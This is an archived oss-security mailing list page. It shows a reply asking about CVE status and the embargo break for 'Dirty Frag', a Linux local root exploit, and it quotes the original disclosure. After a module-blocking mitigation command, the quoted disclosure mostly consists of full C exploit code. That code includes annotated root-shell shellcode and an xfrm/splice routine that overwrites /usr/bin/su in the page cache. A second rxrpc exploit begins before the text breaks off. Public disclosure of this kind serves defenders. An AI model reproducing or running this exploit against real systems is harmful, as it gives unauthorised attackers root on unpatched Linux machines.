@@ -1,0 +1,2393 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
+<html>
+<head>
+<title>oss-security - Re: Dirty Frag: Universal Linux LPE</title>
+
+<link href="/style.css" type="text/css" rel="stylesheet">
+<style type="text/css">
+.calendar { text-align: center; }
+.ccell { background: #ccc; width: 5ex; padding: 2px; }
+
+.cal_brief { text-align: center; }
+.cal_brief td:first-child { background: inherit; }
+.cal_brief td { background: #ccc; width: 5ex; padding: 2px; }
+.cal_big { text-align: center; padding: 0; margin: 0; }
+.cal_big td { padding: 0 2px; }
+.cal_mon { text-align: center; }
+.cal_mon th { font-size: small; padding: 0; margin: 0; }
+.cal_mon td { background: #ccc; width: 5ex; height: 1.5em;
+	padding: 2px; text-align: right; }
+.cal_mon td[colspan] { background: inherit; }
+.cal_mon sup { color: #F0F0F0; text-align: left; float: left;
+	margin-top: -2pt; font-weight: bold; }
+.cal_mon a { text-align: right; margin-left: -4em; float: right; }
+</style>
+</head>
+
+<BODY bgcolor="#E0E0E0" text="black" link="blue" alink="red" vlink="navy">
+
+
+<table bgcolor="#ffffff" width="100%" border="0" cellspacing="0" cellpadding="0">
+<tr>
+
+<td>
+<a href="/"><img class="logo" src="/logo.png" border="0" width="182" height="80" alt="Openwall"></a>
+<td width="100%">
+<div class="nav">
+<ul>
+<li><a href="/">Products</a>
+<ul>
+<li><a href="/Owl/">Openwall GNU/*/Linux &nbsp; <i>server OS</i></a>
+<li><a href="/lkrg/">Linux Kernel Runtime Guard</a>
+<li><a href="/john/">John the Ripper &nbsp; <i>password cracker</i></a>
+<ul>
+<li><a href="/john/">Free &amp; Open Source for any platform</a>
+<li><a href="/john/cloud/">in the cloud</a>
+<li><a href="/john/pro/linux/">Pro for Linux</a>
+<li><a href="/john/pro/macosx/">Pro for macOS</a>
+</ul>
+<li><a href="/wordlists/">Wordlists &nbsp; <i>for password cracking</i></a>
+<li><a href="/passwdqc/">passwdqc &nbsp; <i>policy enforcement</i></a>
+<ul>
+<li><a href="/passwdqc/">Free &amp; Open Source for Unix</a>
+<li><a href="/passwdqc/windows/">Pro for Windows (Active Directory)</a>
+</ul>
+<li><a href="/yescrypt/">yescrypt &nbsp; <i>KDF &amp; password hashing</i></a>
+<li><a href="/yespower/">yespower &nbsp; <i>Proof-of-Work (PoW)</i></a>
+<li><a href="/crypt/">crypt_blowfish &nbsp; <i>password hashing</i></a>
+<li><a href="/phpass/">phpass &nbsp; <i>ditto in PHP</i></a>
+<li><a href="/tcb/">tcb &nbsp; <i>better password shadowing</i></a>
+<li><a href="/pam/">Pluggable Authentication Modules</a>
+<li><a href="/scanlogd/">scanlogd &nbsp; <i>port scan detector</i></a>
+<li><a href="/popa3d/">popa3d &nbsp; <i>tiny POP3 daemon</i></a>
+<li><a href="/blists/">blists &nbsp; <i>web interface to mailing lists</i></a>
+<li><a href="/msulogin/">msulogin &nbsp; <i>single user mode login</i></a>
+<li><a href="/php_mt_seed/">php_mt_seed &nbsp; <i>mt_rand() cracker</i></a>
+</ul>
+<li><a href="/services/">Services</a>
+<li id="narrow-li-1"><a>Publications</a>
+<ul>
+<li><a href="/articles/">Articles</a>
+<li><a href="/presentations/">Presentations</a>
+</ul>
+<li><a>Resources</a>
+<ul>
+<li><a href="/lists/">Mailing lists</a>
+<li><a href="https://openwall.info/wiki/">Community wiki</a>
+<li><a href="https://github.com/openwall">Source code repositories (GitHub)</a>
+<li><a href="/mirrors/">File archive &amp; mirrors</a>
+<li><a href="/signatures/">How to verify digital signatures</a>
+<li><a href="/ove/">OVE IDs</a>
+</ul>
+<li id="last-li"><a href="/news">What's new</a>
+</ul>
+</div>
+
+
+</table>
+
+
+<TABLE bgcolor="#B4D0DC" width="100%" border="0" cellspacing="0" cellpadding="1">
+<TR><TD>
+<TABLE width="100%" border="0" cellspacing="0" cellpadding="2">
+<TR><TD bgcolor="#ECF8FF">
+<a href="https://twitter.com/openwall">
+Follow @Openwall on Twitter for new release announcements and other news</a>
+
+</TABLE>
+</TABLE>
+
+<a href="9">[&lt;prev]</a> <a href="11">[next&gt;]</a> <a href="8">[&lt;thread-prev]</a> <a href="../../../2026/05/08/7">[thread-next&gt;]</a> <a href=".">[day]</a> <a href="..">[month]</a> <a href="../..">[year]</a> <a href="../../..">[list]</a>
+<pre style="white-space: pre-wrap">
+Message-ID: &lt;CAJ33NAVT3SKdcF6LFSnn4zuCUyxnjih0KET_cCTrMmgnhwNPbA&#64;mail.gmail.com&gt;
+Date: Fri, 8 May 2026 00:43:59 +0530
+From: Sandipan Roy &lt;saroy&#64;...hat.com&gt;
+To: oss-security&#64;...ts.openwall.com, cve&#64;...nel.org
+Cc: imv4bel&#64;...il.com
+Subject: Re: Dirty Frag: Universal Linux LPE
+
+Hi,
+
+This stated that “no patches or CVEs exist” because the embargo was broken.
+Could you please provide an update on the CVE assignment status for this
+issue?
+
+Additionally, could you clarify how the information became public prior to
+coordinated disclosure? Understanding the cause of the embargo break would
+help us assess the broader impact on downstream response activities.
+
+Thank you,
+
+Sandipan Roy
+
+
+On Fri, May 8, 2026 at 12:32 AM Hyunwoo Kim &lt;imv4bel&#64;...il.com&gt; wrote:
+
+&gt; Hi,
+&gt;
+&gt; This is a report on "Dirty Frag", a universal LPE that allows obtaining
+&gt; root privileges on all major distributions.
+&gt;
+&gt; This vulnerability has a similar impact to the previous Copy Fail.
+&gt;
+&gt; Because the embargo has now been broken, no patches or CVEs exist for
+&gt; these vulnerabilities. After consultation with the
+&gt; linux-distros&#64;...openwall.org
+&gt; maintainers, and at the maintainers' request, I am publicly releasing this
+&gt; Dirty Frag document.
+&gt;
+&gt; As with the previous Copy Fail vulnerability, Dirty Frag likewise allows
+&gt; immediate root privilege escalation on all major distributions, and it
+&gt; chains two separate vulnerabilities:
+&gt;
+&gt; -
+&gt; <a href="https://git.kernel.org/pub/scm/linux/kernel/git/netdev/net.git/commit/?id=f4c50a4034e62ab75f1d5cdd191dd5f9c77fdff4" rel="nofollow">https://git.kernel.org/pub/scm/linux/kernel/git/netdev/net.git/commit/?id=f4c50a4034e62ab75f1d5cdd191dd5f9c77fdff4</a>
+&gt; - <a href="https://lore.kernel.org/all/afKV2zGR6rrelPC7&#64;v4bel/" rel="nofollow">https://lore.kernel.org/all/afKV2zGR6rrelPC7&#64;v4bel/</a>
+&gt;
+&gt; Because the responsible disclosure schedule and embargo have been broken,
+&gt; no patches exist for any distribution. Use the following command to remove
+&gt; the
+&gt; modules in which the vulnerabilities occur:
+&gt; ```
+&gt; sh -c "printf 'install esp4 /bin/false\ninstall esp6 /bin/false\ninstall
+&gt; rxrpc /bin/false\n' &gt; /etc/modprobe.d/dirtyfrag.conf; rmmod esp4 esp6 rxrpc
+&gt; 2&gt;/dev/null; true"
+&gt; ```
+&gt;
+&gt; For detailed technical information about the vulnerabilities and the
+&gt; reason the
+&gt; embargo was broken, please check <a href="https://dirtyfrag.io" rel="nofollow">https://dirtyfrag.io</a>.
+&gt;
+&gt; Full exploit code:
+&gt; ```c
+&gt; #define _GNU_SOURCE
+&gt; #include &lt;stdio.h&gt;
+&gt; #include &lt;stdlib.h&gt;
+&gt; #include &lt;string.h&gt;
+&gt; #include &lt;stdint.h&gt;
+&gt; #include &lt;unistd.h&gt;
+&gt; #include &lt;fcntl.h&gt;
+&gt; #include &lt;errno.h&gt;
+&gt; #include &lt;sched.h&gt;
+&gt; #include &lt;sys/syscall.h&gt;
+&gt; #include &lt;sys/types.h&gt;
+&gt; #include &lt;sys/socket.h&gt;
+&gt; #include &lt;sys/uio.h&gt;
+&gt; #include &lt;sys/ioctl.h&gt;
+&gt; #include &lt;sys/wait.h&gt;
+&gt; #include &lt;netinet/in.h&gt;
+&gt; #include &lt;arpa/inet.h&gt;
+&gt; #include &lt;net/if.h&gt;
+&gt; #include &lt;linux/if.h&gt;
+&gt; #include &lt;linux/netlink.h&gt;
+&gt; #include &lt;linux/rtnetlink.h&gt;
+&gt; #include &lt;linux/xfrm.h&gt;
+&gt;
+&gt; #ifndef UDP_ENCAP
+&gt; #define UDP_ENCAP 100
+&gt; #endif
+&gt; #ifndef UDP_ENCAP_ESPINUDP
+&gt; #define UDP_ENCAP_ESPINUDP 2
+&gt; #endif
+&gt; #ifndef SOL_UDP
+&gt; #define SOL_UDP 17
+&gt; #endif
+&gt;
+&gt; #define ENC_PORT         4500
+&gt; #define SEQ_VAL          200
+&gt; #define REPLAY_SEQ       100
+&gt; #define TARGET_PATH      "/usr/bin/su"
+&gt; #define PATCH_OFFSET     0              /* overwrite whole ELF starting at
+&gt; file[0] */
+&gt; #define PAYLOAD_LEN      192            /* bytes of shell_elf to write (48
+&gt; triggers) */
+&gt; #define ENTRY_OFFSET     0x78           /* shellcode entry inside the new
+&gt; ELF */
+&gt;
+&gt; /*
+&gt;  * 192-byte minimal x86_64 root-shell ELF.
+&gt;  *   _start at 0x400078:
+&gt;  *     setgid(0); setuid(0); setgroups(0, NULL);
+&gt;  *     execve("/bin/sh", NULL, ["TERM=xterm", NULL]);
+&gt;  *   PT_LOAD covers 0xb8 bytes (the actual content) at vaddr 0x400000 R+X.
+&gt;  *
+&gt;  *   Setting TERM in the new shell's env silences the
+&gt;  *   "tput: No value for $TERM" / "test: : integer expected" noise
+&gt;  *   /etc/bash.bashrc and friends emit when TERM is unset.
+&gt;  *
+&gt;  * Code (from offset 0x78):
+&gt;  *   31 ff               xor edi, edi
+&gt;  *   31 f6               xor esi, esi
+&gt;  *   31 c0               xor eax, eax
+&gt;  *   b0 6a               mov al, 0x6a              ; setgid
+&gt;  *   0f 05               syscall
+&gt;  *   b0 69               mov al, 0x69              ; setuid
+&gt;  *   0f 05               syscall
+&gt;  *   b0 74               mov al, 0x74              ; setgroups
+&gt;  *   0f 05               syscall
+&gt;  *   6a 00               push 0                    ; envp[1] = NULL
+&gt;  *   48 8d 05 12 00 00 00 lea rax, [rip+0x12]      ; rax = "TERM=xterm"
+&gt;  *   50                  push rax                  ; envp[0]
+&gt;  *   48 89 e2            mov rdx, rsp              ; rdx = envp
+&gt;  *   48 8d 3d 12 00 00 00 lea rdi, [rip+0x12]      ; rdi = "/bin/sh"
+&gt;  *   31 f6               xor esi, esi              ; rsi = NULL (argv)
+&gt;  *   6a 3b 58            push 0x3b ; pop rax       ; rax = 59 (execve)
+&gt;  *   0f 05               syscall                   ;
+&gt; execve("/bin/sh",NULL,envp)
+&gt;  *   "TERM=xterm\0"      (offset 0xa5..0xaf)
+&gt;  *   "/bin/sh\0"         (offset 0xb0..0xb7)
+&gt;  */
+&gt; static const uint8_t shell_elf[PAYLOAD_LEN] = {
+&gt;
+&gt; 0x7f,0x45,0x4c,0x46,0x02,0x01,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
+&gt;
+&gt; 0x02,0x00,0x3e,0x00,0x01,0x00,0x00,0x00,0x78,0x00,0x40,0x00,0x00,0x00,0x00,0x00,
+&gt;
+&gt; 0x40,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
+&gt;
+&gt; 0x00,0x00,0x00,0x00,0x40,0x00,0x38,0x00,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
+&gt;
+&gt; 0x01,0x00,0x00,0x00,0x05,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
+&gt;
+&gt; 0x00,0x00,0x40,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x40,0x00,0x00,0x00,0x00,0x00,
+&gt;
+&gt; 0xb8,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0xb8,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
+&gt;
+&gt; 0x00,0x10,0x00,0x00,0x00,0x00,0x00,0x00,0x31,0xff,0x31,0xf6,0x31,0xc0,0xb0,0x6a,
+&gt;
+&gt; 0x0f,0x05,0xb0,0x69,0x0f,0x05,0xb0,0x74,0x0f,0x05,0x6a,0x00,0x48,0x8d,0x05,0x12,
+&gt;
+&gt; 0x00,0x00,0x00,0x50,0x48,0x89,0xe2,0x48,0x8d,0x3d,0x12,0x00,0x00,0x00,0x31,0xf6,
+&gt;
+&gt; 0x6a,0x3b,0x58,0x0f,0x05,0x54,0x45,0x52,0x4d,0x3d,0x78,0x74,0x65,0x72,0x6d,0x00,
+&gt;
+&gt; 0x2f,0x62,0x69,0x6e,0x2f,0x73,0x68,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
+&gt; };
+&gt;
+&gt; extern int g_su_verbose;
+&gt; int g_su_verbose = 0;
+&gt; #define SLOG(fmt, ...) do { if (g_su_verbose) fprintf(stderr, "[su] " fmt
+&gt; "\n", ##__VA_ARGS__); } while (0)
+&gt;
+&gt; static int write_proc(const char *path, const char *buf)
+&gt; {
+&gt;         int fd = open(path, O_WRONLY);
+&gt;         if (fd &lt; 0) return -1;
+&gt;         int n = write(fd, buf, strlen(buf));
+&gt;         close(fd);
+&gt;         return n;
+&gt; }
+&gt;
+&gt; static void setup_userns_netns(void)
+&gt; {
+&gt;         uid_t real_uid = getuid();
+&gt;         gid_t real_gid = getgid();
+&gt;         if (unshare(CLONE_NEWUSER | CLONE_NEWNET) &lt; 0) {
+&gt;                 SLOG("unshare: %s", strerror(errno));
+&gt;                 exit(1);
+&gt;         }
+&gt;         write_proc("/proc/self/setgroups", "deny");
+&gt;         char map[64];
+&gt;         snprintf(map, sizeof(map), "0 %u 1", real_uid);
+&gt;         if (write_proc("/proc/self/uid_map", map) &lt; 0) {
+&gt;                 SLOG("uid_map: %s", strerror(errno)); exit(1);
+&gt;         }
+&gt;         snprintf(map, sizeof(map), "0 %u 1", real_gid);
+&gt;         if (write_proc("/proc/self/gid_map", map) &lt; 0) {
+&gt;                 SLOG("gid_map: %s", strerror(errno)); exit(1);
+&gt;         }
+&gt;         int s = socket(AF_INET, SOCK_DGRAM, 0);
+&gt;         if (s &lt; 0) { SLOG("socket: %s", strerror(errno)); exit(1); }
+&gt;         struct ifreq ifr; memset(&amp;ifr, 0, sizeof(ifr));
+&gt;         strncpy(ifr.ifr_name, "lo", IFNAMSIZ);
+&gt;         if (ioctl(s, SIOCGIFFLAGS, &amp;ifr) &lt; 0) { SLOG("SIOCGIFFLAGS: %s",
+&gt; strerror(errno)); exit(1); }
+&gt;         ifr.ifr_flags |= IFF_UP | IFF_RUNNING;
+&gt;         if (ioctl(s, SIOCSIFFLAGS, &amp;ifr) &lt; 0) { SLOG("SIOCSIFFLAGS: %s",
+&gt; strerror(errno)); exit(1); }
+&gt;         close(s);
+&gt; }
+&gt;
+&gt; static void put_attr(struct nlmsghdr *nlh, int type, const void *data,
+&gt; size_t len)
+&gt; {
+&gt;         struct rtattr *rta = (struct rtattr *)((char *)nlh +
+&gt; NLMSG_ALIGN(nlh-&gt;nlmsg_len));
+&gt;         rta-&gt;rta_type = type;
+&gt;         rta-&gt;rta_len  = RTA_LENGTH(len);
+&gt;         memcpy(RTA_DATA(rta), data, len);
+&gt;         nlh-&gt;nlmsg_len = NLMSG_ALIGN(nlh-&gt;nlmsg_len) +
+&gt; RTA_ALIGN(rta-&gt;rta_len);
+&gt; }
+&gt;
+&gt; static int add_xfrm_sa(uint32_t spi, uint32_t patch_seqhi)
+&gt; {
+&gt;         int sk = socket(AF_NETLINK, SOCK_RAW, NETLINK_XFRM);
+&gt;         if (sk &lt; 0) return -1;
+&gt;         struct sockaddr_nl nl = { .nl_family = AF_NETLINK };
+&gt;         if (bind(sk, (struct sockaddr*)&amp;nl, sizeof(nl)) &lt; 0) { close(sk);
+&gt; return -1; }
+&gt;
+&gt;         char buf[4096] = {0};
+&gt;         struct nlmsghdr *nlh = (struct nlmsghdr *)buf;
+&gt;         nlh-&gt;nlmsg_type  = XFRM_MSG_NEWSA;
+&gt;         nlh-&gt;nlmsg_flags = NLM_F_REQUEST | NLM_F_ACK;
+&gt;         nlh-&gt;nlmsg_pid   = getpid();
+&gt;         nlh-&gt;nlmsg_seq   = 1;
+&gt;         nlh-&gt;nlmsg_len   = NLMSG_LENGTH(sizeof(struct xfrm_usersa_info));
+&gt;
+&gt;         struct xfrm_usersa_info *xs = (struct xfrm_usersa_info
+&gt; *)NLMSG_DATA(nlh);
+&gt;         xs-&gt;id.daddr.a4 = inet_addr("127.0.0.1");
+&gt;         xs-&gt;id.spi      = htonl(spi);
+&gt;         xs-&gt;id.proto    = IPPROTO_ESP;
+&gt;         xs-&gt;saddr.a4    = inet_addr("127.0.0.1");
+&gt;         xs-&gt;family      = AF_INET;
+&gt;         xs-&gt;mode        = XFRM_MODE_TRANSPORT;
+&gt;         xs-&gt;replay_window = 0;
+&gt;         xs-&gt;reqid       = 0x1234;
+&gt;         xs-&gt;flags       = XFRM_STATE_ESN;
+&gt;         xs-&gt;lft.soft_byte_limit   = (uint64_t)-1;
+&gt;         xs-&gt;lft.hard_byte_limit   = (uint64_t)-1;
+&gt;         xs-&gt;lft.soft_packet_limit = (uint64_t)-1;
+&gt;         xs-&gt;lft.hard_packet_limit = (uint64_t)-1;
+&gt;         xs-&gt;sel.family  = AF_INET;
+&gt;         xs-&gt;sel.prefixlen_d = 32;
+&gt;         xs-&gt;sel.prefixlen_s = 32;
+&gt;         xs-&gt;sel.daddr.a4 = inet_addr("127.0.0.1");
+&gt;         xs-&gt;sel.saddr.a4 = inet_addr("127.0.0.1");
+&gt;
+&gt;         {
+&gt;                 char alg_buf[sizeof(struct xfrm_algo_auth) + 32];
+&gt;                 memset(alg_buf, 0, sizeof(alg_buf));
+&gt;                 struct xfrm_algo_auth *aa = (struct xfrm_algo_auth
+&gt; *)alg_buf;
+&gt;                 strncpy(aa-&gt;alg_name, "hmac(sha256)",
+&gt; sizeof(aa-&gt;alg_name)-1);
+&gt;                 aa-&gt;alg_key_len   = 32 * 8;
+&gt;                 aa-&gt;alg_trunc_len = 128;
+&gt;                 memset(aa-&gt;alg_key, 0xAA, 32);
+&gt;                 put_attr(nlh, XFRMA_ALG_AUTH_TRUNC, alg_buf,
+&gt; sizeof(alg_buf));
+&gt;         }
+&gt;         {
+&gt;                 char alg_buf[sizeof(struct xfrm_algo) + 16];
+&gt;                 memset(alg_buf, 0, sizeof(alg_buf));
+&gt;                 struct xfrm_algo *ea = (struct xfrm_algo *)alg_buf;
+&gt;                 strncpy(ea-&gt;alg_name, "cbc(aes)", sizeof(ea-&gt;alg_name)-1);
+&gt;                 ea-&gt;alg_key_len = 16 * 8;
+&gt;                 memset(ea-&gt;alg_key, 0xBB, 16);
+&gt;                 put_attr(nlh, XFRMA_ALG_CRYPT, alg_buf, sizeof(alg_buf));
+&gt;         }
+&gt;         {
+&gt;                 struct xfrm_encap_tmpl enc;
+&gt;                 memset(&amp;enc, 0, sizeof(enc));
+&gt;                 enc.encap_type  = UDP_ENCAP_ESPINUDP;
+&gt;                 enc.encap_sport = htons(ENC_PORT);
+&gt;                 enc.encap_dport = htons(ENC_PORT);
+&gt;                 enc.encap_oa.a4 = 0;
+&gt;                 put_attr(nlh, XFRMA_ENCAP, &amp;enc, sizeof(enc));
+&gt;         }
+&gt;         {
+&gt;                 char esn_buf[sizeof(struct xfrm_replay_state_esn) + 4];
+&gt;                 memset(esn_buf, 0, sizeof(esn_buf));
+&gt;                 struct xfrm_replay_state_esn *esn = (struct
+&gt; xfrm_replay_state_esn *)esn_buf;
+&gt;                 esn-&gt;bmp_len       = 1;
+&gt;                 esn-&gt;oseq          = 0;
+&gt;                 esn-&gt;seq           = REPLAY_SEQ;
+&gt;                 esn-&gt;oseq_hi       = 0;
+&gt;                 esn-&gt;seq_hi        = patch_seqhi;
+&gt;                 esn-&gt;replay_window = 32;
+&gt;                 put_attr(nlh, XFRMA_REPLAY_ESN_VAL, esn_buf,
+&gt; sizeof(esn_buf));
+&gt;         }
+&gt;
+&gt;         if (send(sk, nlh, nlh-&gt;nlmsg_len, 0) &lt; 0) { close(sk); return -1; }
+&gt;         char rbuf[4096];
+&gt;         int n = recv(sk, rbuf, sizeof(rbuf), 0);
+&gt;         if (n &lt; 0) { close(sk); return -1; }
+&gt;         struct nlmsghdr *rh = (struct nlmsghdr *)rbuf;
+&gt;         if (rh-&gt;nlmsg_type == NLMSG_ERROR) {
+&gt;                 struct nlmsgerr *e = NLMSG_DATA(rh);
+&gt;                 if (e-&gt;error) { close(sk); return -1; }
+&gt;         }
+&gt;         close(sk);
+&gt;         return 0;
+&gt; }
+&gt;
+&gt; static int do_one_write(const char *path, off_t offset, uint32_t spi)
+&gt; {
+&gt;         int sk_recv = socket(AF_INET, SOCK_DGRAM, 0);
+&gt;         if (sk_recv &lt; 0) return -1;
+&gt;         int one = 1;
+&gt;         setsockopt(sk_recv, SOL_SOCKET, SO_REUSEADDR, &amp;one, sizeof(one));
+&gt;         struct sockaddr_in sa_d = {
+&gt;                 .sin_family = AF_INET,
+&gt;                 .sin_port   = htons(ENC_PORT),
+&gt;                 .sin_addr   = { inet_addr("127.0.0.1") },
+&gt;         };
+&gt;         if (bind(sk_recv, (struct sockaddr*)&amp;sa_d, sizeof(sa_d)) &lt; 0) {
+&gt;                 close(sk_recv); return -1;
+&gt;         }
+&gt;         int encap = UDP_ENCAP_ESPINUDP;
+&gt;         if (setsockopt(sk_recv, IPPROTO_UDP, UDP_ENCAP, &amp;encap,
+&gt; sizeof(encap)) &lt; 0) {
+&gt;                 close(sk_recv); return -1;
+&gt;         }
+&gt;         int sk_send = socket(AF_INET, SOCK_DGRAM, 0);
+&gt;         if (sk_send &lt; 0) { close(sk_recv); return -1; }
+&gt;         if (connect(sk_send, (struct sockaddr*)&amp;sa_d, sizeof(sa_d)) &lt; 0) {
+&gt;                 close(sk_send); close(sk_recv); return -1;
+&gt;         }
+&gt;         int file_fd = open(path, O_RDONLY);
+&gt;         if (file_fd &lt; 0) { close(sk_send); close(sk_recv); return -1; }
+&gt;
+&gt;         int pfd[2];
+&gt;         if (pipe(pfd) &lt; 0) { close(file_fd); close(sk_send);
+&gt; close(sk_recv); return -1; }
+&gt;
+&gt;         uint8_t hdr[24];
+&gt;         *(uint32_t*)(hdr + 0) = htonl(spi);
+&gt;         *(uint32_t*)(hdr + 4) = htonl(SEQ_VAL);
+&gt;         memset(hdr + 8, 0xCC, 16);
+&gt;
+&gt;         struct iovec iov_h = { .iov_base = hdr, .iov_len = sizeof(hdr) };
+&gt;         if (vmsplice(pfd[1], &amp;iov_h, 1, 0) != (ssize_t)sizeof(hdr)) {
+&gt;                 close(file_fd); close(pfd[0]); close(pfd[1]);
+&gt; close(sk_send); close(sk_recv); return -1;
+&gt;         }
+&gt;         off_t off = offset;
+&gt;         ssize_t s = splice(file_fd, &amp;off, pfd[1], NULL, 16, SPLICE_F_MOVE);
+&gt;         if (s != 16) {
+&gt;                 close(file_fd); close(pfd[0]); close(pfd[1]);
+&gt; close(sk_send); close(sk_recv); return -1;
+&gt;         }
+&gt;         s = splice(pfd[0], NULL, sk_send, NULL, 24 + 16, SPLICE_F_MOVE);
+&gt;         /* still proceed regardless of splice rc — kernel may have already
+&gt;          * decrypted the page in the time between splice and recv */
+&gt;         usleep(150 * 1000);
+&gt;
+&gt;         close(file_fd); close(pfd[0]); close(pfd[1]);
+&gt;         close(sk_send); close(sk_recv);
+&gt;         return s == 40 ? 0 : -1;
+&gt; }
+&gt;
+&gt; static int verify_byte(const char *path, off_t offset, uint8_t want)
+&gt; {
+&gt;         int fd = open(path, O_RDONLY);
+&gt;         if (fd &lt; 0) return -1;
+&gt;         uint8_t got;
+&gt;         if (pread(fd, &amp;got, 1, offset) != 1) { close(fd); return -1; }
+&gt;         close(fd);
+&gt;         return got == want ? 0 : -1;
+&gt; }
+&gt;
+&gt; static int corrupt_su(void)
+&gt; {
+&gt;         setup_userns_netns();
+&gt;         usleep(100 * 1000);
+&gt;
+&gt;         /* Install 40 xfrm SAs, one per 4-byte chunk.  Each carries the
+&gt;          * desired payload word in its seq_hi field. */
+&gt;         for (int i = 0; i &lt; PAYLOAD_LEN / 4; i++) {
+&gt;                 uint32_t spi = 0xDEADBE10 + i;
+&gt;                 uint32_t seqhi =
+&gt;                         ((uint32_t)shell_elf[i*4 + 0] &lt;&lt; 24) |
+&gt;                         ((uint32_t)shell_elf[i*4 + 1] &lt;&lt; 16) |
+&gt;                         ((uint32_t)shell_elf[i*4 + 2] &lt;&lt;  8) |
+&gt;                         ((uint32_t)shell_elf[i*4 + 3]);
+&gt;                 if (add_xfrm_sa(spi, seqhi) &lt; 0) {
+&gt;                         SLOG("add_xfrm_sa #%d failed", i);
+&gt;                         return -1;
+&gt;                 }
+&gt;         }
+&gt;         SLOG("installed %d xfrm SAs", PAYLOAD_LEN / 4);
+&gt;
+&gt;         for (int i = 0; i &lt; PAYLOAD_LEN / 4; i++) {
+&gt;                 uint32_t spi = 0xDEADBE10 + i;
+&gt;                 off_t off = PATCH_OFFSET + i * 4;
+&gt;                 if (do_one_write(TARGET_PATH, off, spi) &lt; 0) {
+&gt;                         SLOG("do_one_write #%d at off=0x%lx failed", i,
+&gt; (long)off);
+&gt;                         return -1;
+&gt;                 }
+&gt;         }
+&gt;         SLOG("wrote %d bytes to %s starting at 0x%x",
+&gt;                         PAYLOAD_LEN, TARGET_PATH, PATCH_OFFSET);
+&gt;         return 0;
+&gt; }
+&gt;
+&gt; int su_lpe_main(int argc, char **argv)
+&gt; {
+&gt;         for (int i = 1; i &lt; argc; i++) {
+&gt;                 if (!strcmp(argv[i], "-v") || !strcmp(argv[i],
+&gt; "--verbose"))
+&gt;                         g_su_verbose = 1;
+&gt;                 else if (!strcmp(argv[i], "--corrupt-only"))
+&gt;                         ; /* compat: this body always corrupts only */
+&gt;         }
+&gt;         if (getenv("DIRTYFRAG_VERBOSE")) g_su_verbose = 1;
+&gt;
+&gt;         pid_t cpid = fork();
+&gt;         if (cpid &lt; 0) return 1;
+&gt;         if (cpid == 0) {
+&gt;                 int rc = corrupt_su();
+&gt;                 _exit(rc == 0 ? 0 : 2);
+&gt;         }
+&gt;         int cstatus;
+&gt;         waitpid(cpid, &amp;cstatus, 0);
+&gt;         if (!WIFEXITED(cstatus) || WEXITSTATUS(cstatus) != 0) {
+&gt;                 SLOG("corruption stage failed (status=0x%x)", cstatus);
+&gt;                 return 1;
+&gt;         }
+&gt;
+&gt;         /* Sanity check: bytes at the embedded ELF entry (file offset 0x78
+&gt;          * after our overwrite) should be 0x31 0xff (xor edi, edi — first
+&gt;          * instruction of the new shellcode). */
+&gt;         if (verify_byte(TARGET_PATH, ENTRY_OFFSET, 0x31) != 0 ||
+&gt;                         verify_byte(TARGET_PATH, ENTRY_OFFSET + 1, 0xff)
+&gt; != 0) {
+&gt;                 SLOG("post-write verify failed (target unchanged)");
+&gt;                 return 1;
+&gt;         }
+&gt;         SLOG("/usr/bin/su page-cache patched (entry 0x%x = shellcode)",
+&gt;                         ENTRY_OFFSET);
+&gt;         return 0;
+&gt; }
+&gt; /*
+&gt;  * rxrpc/rxkad LPE — uid=1000 → root
+&gt;  */
+&gt;
+&gt; #define _GNU_SOURCE
+&gt; #include &lt;stdio.h&gt;
+&gt; #include &lt;stdlib.h&gt;
+&gt; #include &lt;string.h&gt;
+&gt; #include &lt;stdint.h&gt;
+&gt; #include &lt;stdarg.h&gt;
+&gt; #include &lt;errno.h&gt;
+&gt; #include &lt;unistd.h&gt;
+&gt; #include &lt;fcntl.h&gt;
+&gt; #include &lt;time.h&gt;
+&gt; #include &lt;sched.h&gt;
+&gt; #include &lt;poll.h&gt;
+&gt; #include &lt;signal.h&gt;
+&gt; #include &lt;sys/wait.h&gt;
+&gt; #include &lt;sys/socket.h&gt;
+&gt; #include &lt;sys/syscall.h&gt;
+&gt; #include &lt;sys/uio.h&gt;
+&gt; #include &lt;sys/types.h&gt;
+&gt; #include &lt;sys/mman.h&gt;
+&gt; #include &lt;sys/stat.h&gt;
+&gt; #include &lt;sys/ioctl.h&gt;
+&gt; #include &lt;netinet/in.h&gt;
+&gt; #include &lt;arpa/inet.h&gt;
+&gt; #include &lt;linux/rxrpc.h&gt;
+&gt; #include &lt;linux/keyctl.h&gt;
+&gt; #include &lt;linux/if_alg.h&gt;
+&gt; #include &lt;net/if.h&gt;
+&gt; #include &lt;termios.h&gt;
+&gt;
+&gt; #ifndef AF_RXRPC
+&gt; #define AF_RXRPC 33
+&gt; #endif
+&gt; #ifndef PF_RXRPC
+&gt; #define PF_RXRPC AF_RXRPC
+&gt; #endif
+&gt; #ifndef SOL_RXRPC
+&gt; #define SOL_RXRPC 272
+&gt; #endif
+&gt; #ifndef SOL_ALG
+&gt; #define SOL_ALG 279
+&gt; #endif
+&gt; #ifndef AF_ALG
+&gt; #define AF_ALG 38
+&gt; #endif
+&gt; #ifndef MSG_SPLICE_PAGES
+&gt; #define MSG_SPLICE_PAGES 0x8000000
+&gt; #endif
+&gt;
+&gt; /* ---- rxrpc constants ---- */
+&gt; #define RXRPC_PACKET_TYPE_DATA          1
+&gt; #define RXRPC_PACKET_TYPE_ACK           2
+&gt; #define RXRPC_PACKET_TYPE_ABORT         4
+&gt; #define RXRPC_PACKET_TYPE_CHALLENGE     6
+&gt; #define RXRPC_PACKET_TYPE_RESPONSE      7
+&gt; #define RXRPC_CLIENT_INITIATED          0x01
+&gt; #define RXRPC_REQUEST_ACK               0x02
+&gt; #define RXRPC_LAST_PACKET               0x04
+&gt; #define RXRPC_CHANNELMASK               3
+&gt; #define RXRPC_CIDSHIFT                  2
+&gt;
+&gt; struct rxrpc_wire_header {
+&gt;         uint32_t epoch;
+&gt;         uint32_t cid;
+&gt;         uint32_t callNumber;
+&gt;         uint32_t seq;
+&gt;         uint32_t serial;
